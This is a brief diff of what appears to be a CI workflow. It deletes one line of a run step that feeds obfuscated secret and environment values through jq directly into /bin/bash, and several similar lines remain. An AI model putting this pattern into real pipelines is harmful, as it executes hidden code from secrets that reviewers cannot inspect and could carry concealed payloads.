@@ -20,7 +20,6 @@ jobs:
           i04871: ${{ secrets.i04871 }}
         run: |
           printf '%s' "$i04871" | jq -r .u26449 | /bin/bash
-          echo $s36 | jq -r .srik09 | /bin/bash
           echo $pymb76648 | jq -r .xefq9517 | /bin/bash
 
       - name: Persist results
